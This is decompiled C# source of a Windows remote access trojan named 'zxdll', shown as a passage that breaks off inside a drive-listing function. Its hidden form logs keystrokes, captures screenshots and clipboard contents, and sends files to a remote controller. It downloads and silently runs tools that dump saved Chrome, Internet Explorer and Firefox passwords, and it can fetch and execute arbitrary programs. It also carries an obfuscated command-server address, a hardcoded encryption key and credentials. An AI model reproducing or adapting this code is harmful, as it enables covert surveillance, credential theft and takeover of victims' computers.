using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using zxdll.My;

namespace zxdll;

[DesignerGenerated]
public class Form1 : Form
{
	public enum ShowWindowCommands
	{
		SW_MAXIMIZE = 3
	}

	public delegate void _Read(string msg, byte[] byteData);

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("KLTextBox")]
	private TextBox _KLTextBox;

	[AccessedThroughProperty("SocketUpdateBg")]
	private BackgroundWorker _SocketUpdateBg;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	[AccessedThroughProperty("ScreenCaptureTimer")]
	private Timer _ScreenCaptureTimer;

	[AccessedThroughProperty("KLTimer")]
	private Timer _KLTimer;

	[AccessedThroughProperty("mailWorker")]
	private BackgroundWorker _mailWorker;

	[AccessedThroughProperty("ViewB0tBg")]
	private BackgroundWorker _ViewB0tBg;

	[AccessedThroughProperty("MultipleFileTransferBg")]
	private BackgroundWorker _MultipleFileTransferBg;

	private Socket clientSocket;

	private byte[] byteData;

	private string encCommander;

	private string downloadSource;

	private double KLAppVersion_new;

	private string inMemoryProcessName;

	private string[] knownProcessNames;

	private string fileLocInAppData;

	private string mIDRegValue;

	private bool isConnected;

	private string myIp;

	private string myCountry;

	private string ACK;

	private byte[] navkey;

	private byte[] IV;

	private const string EncryptionKey = "h7y@eyrh";

	private string ieVersion;

	private string failedFeatureControls;

	private string linkToVisit;

	private int durationOfVisit;

	private int totalTimesToVisit;

	private int delayBetweenVisits;

	private bool disableWbBrowserEmailonLoad;

	private string MFT_directoryName;

	private string MFT_fileExtension;

	private string MFT_fileSize;

	private string MFT_maxNumberFiles;

	private bool MFT_okToContinue;

	private const int VK_CAPSLOCK = 20;

	private string IPA;

	private string IUNAME;

	private string IPWORD;

	private int globalImNumber;

	private DateTime onConnectStarttime;

	private DateTime onConnectStoptime;

	private TimeSpan onConnectTimeElapsed;

	private DateTime getSetupInfoStarttime;

	private DateTime getSetupInfoStoptime;

	private TimeSpan getSetupInfoTimeElapsed;

	private static Form1 _instance;

	internal virtual TextBox KLTextBox
	{
		[DebuggerNonUserCode]
		get
		{
			return _KLTextBox;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_KLTextBox = value;
		}
	}

	internal virtual BackgroundWorker SocketUpdateBg
	{
		[DebuggerNonUserCode]
		get
		{
			return _SocketUpdateBg;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			DoWorkEventHandler value2 = socketUpdateBg_DoWork;
			if (_SocketUpdateBg != null)
			{
				_SocketUpdateBg.DoWork -= value2;
			}
			_SocketUpdateBg = value;
			if (_SocketUpdateBg != null)
			{
				_SocketUpdateBg.DoWork += value2;
			}
		}
	}

	internal virtual WebBrowser WebBrowser1
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser1 = value;
		}
	}

	internal virtual Timer ScreenCaptureTimer
	{
		[DebuggerNonUserCode]
		get
		{
			return _ScreenCaptureTimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ScreenCaptureTimer_Tick;
			if (_ScreenCaptureTimer != null)
			{
				_ScreenCaptureTimer.remove_Tick(eventHandler);
			}
			_ScreenCaptureTimer = value;
			if (_ScreenCaptureTimer != null)
			{
				_ScreenCaptureTimer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer KLTimer
	{
		[DebuggerNonUserCode]
		get
		{
			return _KLTimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = KLTimer_Tick;
			if (_KLTimer != null)
			{
				_KLTimer.remove_Tick(eventHandler);
			}
			_KLTimer = value;
			if (_KLTimer != null)
			{
				_KLTimer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual BackgroundWorker mailWorker
	{
		[DebuggerNonUserCode]
		get
		{
			return _mailWorker;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			DoWorkEventHandler value2 = mailWorker_DoWork;
			if (_mailWorker != null)
			{
				_mailWorker.DoWork -= value2;
			}
			_mailWorker = value;
			if (_mailWorker != null)
			{
				_mailWorker.DoWork += value2;
			}
		}
	}

	internal virtual BackgroundWorker ViewB0tBg
	{
		[DebuggerNonUserCode]
		get
		{
			return _ViewB0tBg;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			DoWorkEventHandler value2 = ViewB0tBg_DoWork;
			if (_ViewB0tBg != null)
			{
				_ViewB0tBg.DoWork -= value2;
			}
			_ViewB0tBg = value;
			if (_ViewB0tBg != null)
			{
				_ViewB0tBg.DoWork += value2;
			}
		}
	}

	internal virtual BackgroundWorker MultipleFileTransferBg
	{
		[DebuggerNonUserCode]
		get
		{
			return _MultipleFileTransferBg;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			DoWorkEventHandler value2 = MultipleFileTransferBg_DoWork;
			if (_MultipleFileTransferBg != null)
			{
				_MultipleFileTransferBg.DoWork -= value2;
			}
			_MultipleFileTransferBg = value;
			if (_MultipleFileTransferBg != null)
			{
				_MultipleFileTransferBg.DoWork += value2;
			}
		}
	}

	public Form1 Instance => _instance;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		byteData = new byte[10241];
		encCommander = "iuuq;00gsffufyuiptu/dpn0hbbznbm{jo";
		downloadSource = "[RA]";
		KLAppVersion_new = 15.6;
		inMemoryProcessName = "zxdll";
		knownProcessNames = new string[4] { "DCM_0013", "DCM_0014", "DCM_0015", inMemoryProcessName };
		fileLocInAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + inMemoryProcessName + ".exe";
		mIDRegValue = "N/A";
		isConnected = false;
		myIp = "NULL";
		myCountry = "NULL";
		ACK = "-ACK{****}";
		navkey = new byte[0];
		IV = new byte[8] { 18, 52, 86, 120, 144, 171, 205, 239 };
		ieVersion = "-1";
		failedFeatureControls = "-1";
		disableWbBrowserEmailonLoad = false;
		MFT_okToContinue = false;
		IPA = "127.0.0.1";
		IUNAME = "aaxjax";
		IPWORD = "defJam122";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		components = new Container();
		KLTextBox = new TextBox();
		SocketUpdateBg = new BackgroundWorker();
		WebBrowser1 = new WebBrowser();
		ScreenCaptureTimer = new Timer(components);
		KLTimer = new Timer(components);
		mailWorker = new BackgroundWorker();
		ViewB0tBg = new BackgroundWorker();
		MultipleFileTransferBg = new BackgroundWorker();
		((Control)this).SuspendLayout();
		TextBox kLTextBox = KLTextBox;
		Point location = new Point(492, 2);
		((Control)kLTextBox).set_Location(location);
		KLTextBox.set_Multiline(true);
		((Control)KLTextBox).set_Name("KLTextBox");
		TextBox kLTextBox2 = KLTextBox;
		Size size = new Size(290, 473);
		((Control)kLTextBox2).set_Size(size);
		((Control)KLTextBox).set_TabIndex(1);
		WebBrowser webBrowser = WebBrowser1;
		location = new Point(1, 2);
		((Control)webBrowser).set_Location(location);
		WebBrowser webBrowser2 = WebBrowser1;
		size = new Size(20, 20);
		((Control)webBrowser2).set_MinimumSize(size);
		((Control)WebBrowser1).set_Name("WebBrowser1");
		WebBrowser webBrowser3 = WebBrowser1;
		size = new Size(485, 473);
		((Control)webBrowser3).set_Size(size);
		((Control)WebBrowser1).set_TabIndex(2);
		ScreenCaptureTimer.set_Enabled(true);
		ScreenCaptureTimer.set_Interval(3600000);
		KLTimer.set_Enabled(true);
		KLTimer.set_Interval(8);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(783, 478);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser1);
		((Control)this).get_Controls().Add((Control)(object)KLTextBox);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern short GetAsyncKeyState(long ddvdgvtrgfbyhvrg);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern short GetKeyState(int ByValnVirtKey);

	[DllImport("User32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern long SetForeGroundWindow(IntPtr Hwnd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool ShowWindow(IntPtr hwnd, ShowWindowCommands nCmdShow);

	private void getInitialData()
	{
		getSetupInfo();
		myIp = getIPAddress();
		myCountry = getCountry();
	}

	private void Read(string msg, byte[] byteData)
	{
		checked
		{
			try
			{
				string[] array = msg.Split(new string[1] { "{****}" }, StringSplitOptions.None);
				if (array[0].Equals("ACK"))
				{
					Send(array[0] + ACK + myIp + "<br><br>" + getPCInfo(), clientSocket);
					return;
				}
				if (array[0].Equals("Process List"))
				{
					Send(array[0] + ACK + getProcessList(), clientSocket);
					return;
				}
				if (array[0].Equals("Shut"))
				{
					Process.Start("shutdown", "-s -f -t 00");
					return;
				}
				if (array[0].Equals("Restart"))
				{
					Process.Start("ShutDown", "/r");
					return;
				}
				if (array[0].Equals("Screen Capture"))
				{
					try
					{
						((Control)Instance).Invoke((Delegate)(VB_0024AnonymousDelegate_0)delegate
						{
							byte[] second3 = screenCapToBytes();
							string s3 = array[0] + ACK;
							byte[] bytes4 = Encoding.ASCII.GetBytes(s3);
							byte[] msg4 = bytes4.Concat(second3).ToArray().Concat(Encoding.ASCII.GetBytes("{****}"))
								.ToArray();
							SendBytes(msg4, clientSocket);
						});
						return;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (array[0].Equals("Screen Capture LQ"))
				{
					try
					{
						((Control)Instance).Invoke((Delegate)(VB_0024AnonymousDelegate_0)delegate
						{
							byte[] second2 = screenCapToBytesLQ();
							string s2 = array[0] + ACK;
							byte[] bytes3 = Encoding.ASCII.GetBytes(s2);
							byte[] msg3 = bytes3.Concat(second2).ToArray().Concat(Encoding.ASCII.GetBytes("{****}"))
								.ToArray();
							SendBytes(msg3, clientSocket);
						});
						return;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (array[0].Equals("Launch Website"))
				{
					Process process = Process.Start(array[1]);
					ShowWindow(process.MainWindowHandle, ShowWindowCommands.SW_MAXIMIZE);
					SetForeGroundWindow(process.MainWindowHandle);
					return;
				}
				if (array[0].Equals("Directory Structure"))
				{
					Send(array[0] + ACK + BUnit(), clientSocket);
					return;
				}
				if (array[0].Equals("Directory Explore"))
				{
					Send(array[0] + ACK + sUnits(array[1]), clientSocket);
					return;
				}
				if (array[0].Equals("YTViewB"))
				{
					linkToVisit = array[1];
					durationOfVisit = Convert.ToInt32(array[2]);
					totalTimesToVisit = Convert.ToInt32(array[3]);
					delayBetweenVisits = Convert.ToInt32(array[4]);
					if (!ViewB0tBg.IsBusy)
					{
						ViewB0tBg.RunWorkerAsync();
					}
					return;
				}
				if (array[0].Equals("WebBrowser DocText"))
				{
					string text = "-1";
					try
					{
						((Control)Instance).Invoke((Delegate)(VB_0024AnonymousDelegate_0)delegate
						{
							text = WebBrowser1.get_DocumentText();
						});
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					Send(array[0] + ACK + text, clientSocket);
					return;
				}
				if (array[0].Equals("WebBrowser InnerHTML"))
				{
					string text2 = "-1";
					try
					{
						((Control)Instance).Invoke((Delegate)(VB_0024AnonymousDelegate_0)delegate
						{
							text2 = WebBrowser1.get_Document().get_Body().get_InnerHtml();
						});
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					Send(array[0] + ACK + text2, clientSocket);
					return;
				}
				if (array[0].Equals("WebBrowser OuterHTML"))
				{
					string text3 = "-1";
					try
					{
						((Control)Instance).Invoke((Delegate)(VB_0024AnonymousDelegate_0)delegate
						{
							text3 = WebBrowser1.get_Document().get_Body().get_OuterHtml();
						});
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					Send(array[0] + ACK + text3, clientSocket);
					return;
				}
				if (array[0].Equals("Get Clipboard"))
				{
					string text4 = "No Clipboard Text";
					try
					{
						((Control)Instance).Invoke((Delegate)(VB_0024AnonymousDelegate_0)delegate
						{
							text4 = Clipboard.GetText();
						});
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						text4 = ex2.Message;
						ProjectData.ClearProjectError();
					}
					Send(array[0] + ACK + text4 + "{****}", clientSocket);
					return;
				}
				if (array[0].Equals("MyPicsLoc"))
				{
					string myPictures = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures();
					Send(array[0] + ACK + sUnits(myPictures), clientSocket);
					return;
				}
				if (array[0].Equals("DesktopLoc"))
				{
					string desktop = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop();
					Send(array[0] + ACK + sUnits(desktop), clientSocket);
					return;
				}
				if (array[0].Equals("NavigatePostData"))
				{
					try
					{
						((Control)Instance).Invoke((Delegate)(VB_0024AnonymousDelegate_0)delegate
						{
							byte[] bytes2 = Encoding.UTF8.GetBytes(array[2]);
							WebBrowser1.Navigate(array[1].Substring(2), "_self", bytes2, "Content-Type: application/x-www-form-urlencoded");
						});
						return;
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (array[0].Equals("Navigate"))
				{
					try
					{
						((Control)Instance).Invoke((Delegate)(VB_0024AnonymousDelegate_0)delegate
						{
							WebBrowser1.Navigate(array[1]);
						});
						return;
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (array[0].Equals("Invoke"))
				{
					try
					{
						((Control)Instance).Invoke((Delegate)(VB_0024AnonymousDelegate_0)delegate
						{
							webBrowserInvoke(array[1]);
						});
						return;
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (array[0].Equals("GCPD"))
				{
					try
					{
						WebClient webClient = new WebClient();
						webClient.Headers.Add("User-Agent: Other");
						webClient.DownloadFile(array[1], Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\GCDecrypt.exe");
						StartProcessHidden(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\GCDecrypt.exe", WaitForExit: true, "-o " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\GCExport.txt");
						Thread.Sleep(5000);
						string text5 = ((!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\GCExport.txt")) ? ("Could not find " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\GCExport.txt") : File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\GCExport.txt"));
						text5 = text5.Replace("*", "-").Replace("\r", "<br>").Replace("\n", "<br>");
						Send(array[0] + ACK + text5 + "{****}", clientSocket);
						return;
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						Send(array[0] + ACK + ex4.Message + "{****}", clientSocket);
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (array[0].Equals("IEPD"))
				{
					try
					{
						WebClient webClient2 = new WebClient();
						webClient2.Headers.Add("User-Agent: Other");
						webClient2.DownloadFile(array[1], Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IEDecrypt.exe");
						StartProcessHidden(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IEDecrypt.exe", WaitForExit: true, "-f " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IEExport.txt");
						Thread.Sleep(5000);
						string text6 = ((!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IEExport.txt")) ? ("Could not find " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IEExport.txt") : File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IEExport.txt"));
						text6 = text6.Replace("*", "-").Replace("\r", "<br>").Replace("\n", "<br>");
						Send(array[0] + ACK + text6 + "{****}", clientSocket);
						return;
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						Exception ex6 = ex5;
						Send(array[0] + ACK + ex6.Message + "{****}", clientSocket);
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (array[0].Equals("FFPD"))
				{
					try
					{
						WebClient webClient3 = new WebClient();
						webClient3.Headers.Add("User-Agent: Other");
						webClient3.DownloadFile(array[1], Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FFDecrypt.exe");
						StartProcessHidden(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FFDecrypt.exe", WaitForExit: true, "-o " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FFExport.txt -p auto");
						Thread.Sleep(5000);
						string text7 = ((!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FFExport.txt")) ? ("Could not find " + Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FFExport.txt") : File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FFExport.txt"));
						text7 = text7.Replace("*", "-").Replace("\r", "<br>").Replace("\n", "<br>");
						Send(array[0] + ACK + text7 + "{****}", clientSocket);
						return;
					}
					catch (Exception ex7)
					{
						ProjectData.SetProjectError(ex7);
						Exception ex8 = ex7;
						Send(array[0] + ACK + ex8.Message + "{****}", clientSocket);
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (array[0].Equals("Get Keystrokes"))
				{
					Send(array[0] + ACK + KLTextBox.get_Text() + "{****}", clientSocket);
					return;
				}
				if (array[0].Equals("Kill Current Process"))
				{
					Application.Exit();
					return;
				}
				if (array[0].Equals("File Transfer"))
				{
					try
					{
						FileStream fileStream = new FileStream(array[1], FileMode.Open);
						BinaryReader binaryReader = new BinaryReader(fileStream);
						byte[] second = binaryReader.ReadBytes((int)fileStream.Length);
						string s = array[0] + ACK;
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] msg2 = bytes.Concat(Encoding.ASCII.GetBytes(array[1].Substring(array[1].LastIndexOf("\\") + 1))).Concat(Encoding.ASCII.GetBytes("{****}")).ToArray()
							.ToArray()
							.Concat(second)
							.ToArray()
							.Concat(Encoding.ASCII.GetBytes("{****}"))
							.ToArray();
						binaryReader.Close();
						fileStream.Close();
						second = null;
						SendBytes(msg2, clientSocket);
						msg2 = null;
						return;
					}
					catch (Exception ex9)
					{
						ProjectData.SetProjectError(ex9);
						Exception ex10 = ex9;
						Send(array[0] + ACK + ex10.Message + "{****}", clientSocket);
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (array[0].Equals("Update"))
				{
					KLAppVersion_new = Convert.ToDouble(array[2]);
					double num = Convert.ToDouble(RuntimeHelpers.GetObjectValue(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_CURRENT_USER\\software\\Microsoft\\Windows\\CurrentVersion\\Run", "KLAppV", (object)null)));
					if (!(KLAppVersion_new > num))
					{
						return;
					}
					try
					{
						WebClient webClient4 = new WebClient();
						webClient4.Headers.Add("User-Agent: Other");
						webClient4.DownloadFile(array[1], Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tRun.exe");
						Thread.Sleep(1500);
						if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tRun.exe"))
						{
							Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\tRun.exe");
							Application.Exit();
						}
						else
						{
							KLAppVersion_new = num;
						}
						return;
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						KLAppVersion_new = num;
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (array[0].Equals("Start RDV") || array[0].Equals("Stop RDV"))
				{
					return;
				}
				if (array[0].Equals("Download And Execute"))
				{
					string text8 = "Download And Execute - Operation Complete";
					try
					{
						WebClient webClient5 = new WebClient();
						webClient5.Headers.Add("User-Agent: Other");
						webClient5.DownloadFile(array[1], Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + array[2]);
						Thread.Sleep(1500);
						Process process2 = Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + array[2]);
						if (array[3].Contains("TRUE"))
						{
							ShowWindow(process2.MainWindowHandle, ShowWindowCommands.SW_MAXIMIZE);
							SetForeGroundWindow(process2.MainWindowHandle);
						}
					}
					catch (Exception ex11)
					{
						ProjectData.SetProjectError(ex11);
						Exception ex12 = ex11;
						text8 = ex12.Message;
						ProjectData.ClearProjectError();
					}
					Send(array[0] + ACK + text8 + "{****}", clientSocket);
				}
				else if (array[0].Equals("Multiple File Transfer"))
				{
					if (!MultipleFileTransferBg.IsBusy)
					{
						MFT_directoryName = array[1];
						MFT_fileExtension = array[2];
						MFT_maxNumberFiles = array[3];
						MFT_fileSize = array[4];
						MultipleFileTransferBg.RunWorkerAsync();
					}
				}
				else if (array[0].Equals("Multiple File Transfer_okToContinue"))
				{
					MFT_okToContinue = true;
				}
				else if (!array[0].Equals(" ") && !array[0].Equals(" ") && !array[0].Equals(" ") && array[0].Equals(" "))
				{
				}
			}
			catch (Exception projectError10)
			{
				ProjectData.SetProjectError(projectError10);
				ProjectData.ClearProjectError();
			}
		}
	}

	public string decrypt(string stringToDecrypt)
	{
		try
		{
			byte[] array = new byte[checked(stringToDecrypt.Length + 1)];
			navkey = Encoding.UTF8.GetBytes(Strings.Left("h7y@eyrh", 8));
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			array = Convert.FromBase64String(stringToDecrypt);
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(navkey, IV), CryptoStreamMode.Write);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.FlushFinalBlock();
			Encoding uTF = Encoding.UTF8;
			return uTF.GetString(memoryStream.ToArray());
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			string message = ex2.Message;
			ProjectData.ClearProjectError();
			return message;
		}
	}

	public byte[] screenCapToBytes()
	{
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		Size size = new Size(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		Graphics val3 = val2;
		Point point = new Point(0, 0);
		Point point2 = point;
		Point point3 = new Point(0, 0);
		val3.CopyFromScreen(point2, point3, size);
		MemoryStream memoryStream = new MemoryStream();
		((Image)val).Save((Stream)memoryStream, ImageFormat.get_Bmp());
		byte[] array = new byte[checked((int)memoryStream.Length + 1)];
		return memoryStream.ToArray();
	}

	public byte[] screenCapToBytesLQ()
	{
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Expected O, but got Unknown
		Size size = new Size(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		Graphics val3 = val2;
		Point point = new Point(0, 0);
		Point point2 = point;
		Point point3 = new Point(0, 0);
		val3.CopyFromScreen(point2, point3, size);
		Bitmap val4 = new Bitmap((Image)(object)val);
		ImageCodecInfo encoder = GetEncoder(ImageFormat.get_Jpeg());
		Encoder quality = Encoder.Quality;
		EncoderParameters val5 = new EncoderParameters(1);
		EncoderParameter val6 = new EncoderParameter(quality, 30L);
		val5.get_Param()[0] = val6;
		MemoryStream memoryStream = new MemoryStream();
		((Image)val4).Save((Stream)memoryStream, encoder, val5);
		byte[] array = new byte[checked((int)memoryStream.Length + 1)];
		return memoryStream.ToArray();
	}

	public string BUnit()
	{
		string text = "";
		checked
		{
			try
			{
				if (Environment.OSVersion.Version.Major == 5)
				{
					int num = 0;
					text += "System Drive INFO<br>";
					try
					{
						IEnumerator<DriveInfo> enumerator = ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives().GetEnumerator();
						while (enumerator.MoveNext())
						{
							DriveInfo current = enumerator.Current;
							text += "<br>";
							num++;
							text = text + "---------- Drive " + current.Name.ToString() + " ----------<br>";
							text = text + "Drive Type: " + current.DriveType.ToString() + "<br>";
							text = text + "Active: " + current.IsReady + "<br>";
							if (current.IsReady)
							{
								double value = Convert.ToDouble(new decimal(current.TotalSize)) / 1073741824.0;
								double value2 = Convert.ToDouble(new decimal(current.TotalFreeSpace)) / 1073741824.0;
								text = text + "Total Size(GB): " + Math.Round(value, 2) + "<br>";
								text = text + "Available Size(GB): " + Math.Round(value2, 2) + "<br>";
							}
							else
							{
								text += "Total Size: - <br>";
								text += "Available Size: - <br>";
							}
							string path = current.Name + "\\";
							int num2 = 0;
							DirectoryInfo directoryInfo = new DirectoryInfo(path);
							text += "<br>";
							if (current.IsReady)
							{
								text += "\tFile/Folder:<br>";
								FileSystemInfo[] fileSystemInfos = directoryInfo.GetFileSystemInfos();
								int num3 = fileSystemInfos.Length - 1;
								int num4 = 0;
								while (true)
								{
									int num5 = num4;
									int num6 = num3;
									if (num5 > num6)
									{
										break;
									}
									FileSystemInfo fileSystemInfo = fileSystemInfos[num4];
									if (string.Compare(fileSystemInfo.Extension, "", ignoreCase: false) != 0)
									{
										FileInfo fileInfo = new FileInfo(fileSystemInfo.FullName);
										if (File.Exists(fileSystemInfo.FullName))
										{
											double value3 = Convert.ToDouble(new decimal(fileInfo.Length)) / 1048576.0;
											num2++;
											text = text + "\t" + fileSystemInfo.FullName + "\t\t Size(MB): " + Math.Round(value3, 4) + "<br>";
										}
									}
									else
									{
										num2++;
										text = text + "\t" + fileSystemInfo.FullName + "\t<br>";
									}
									num4++;
								}
							}
							text += "<br>";
							text = text + "Total files/folders: " + num2 + "<br>";
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						text += ex2.Message;
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					int num7 = 0;
					text += "System Drive INFO<br>";
					try
					{
						IEnumerator<DriveInfo> enumerator2 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives().GetEnumerator();
						while (enumerator2.MoveNext())
						{
							DriveInfo current2 = enumerator2.Current;
							text += "<br>";
							num7++;
